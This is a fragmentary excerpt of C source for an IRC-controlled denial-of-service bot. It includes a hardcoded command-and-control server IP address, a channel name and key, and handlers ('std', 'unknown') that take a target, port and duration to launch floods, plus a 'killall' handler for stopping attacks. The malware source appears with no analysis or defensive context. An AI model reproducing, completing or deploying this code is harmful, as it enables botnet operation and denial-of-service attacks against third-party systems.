...
#define CHAN "#SPIDERWEB"
#define KEY "SPIDERS"
#define PORT 443
#define PASS ""
#define STD2_STRING "std"
#define STD2_SIZE 50
#define PREFIX "[SPIDER]"
int numservers=1;
char *servers[] = {
  "185.62.188.196",
  (void*)0
...
void std(int sock, char *sender, int argc, char **argv) {
    if (argc < 3) {
        ...
        Send(sock,"PRIVMSG %s :!* +std <target> <port> <secs>\n",chan);
        exit(1);
...
void unknown(int sock, char *sender, int argc, char **argv) {
    ...
    if (argc != 2) {
        Send(sock,"PRIVMSG %s :!* unknown <target> <secs>\n",chan);
        exit(1);
    }
...
void killall(int sock, char *sender, int argc, char **argv) {
        ...
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,"NOTICE %s :Killing All Current Attacks %d.\n",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}
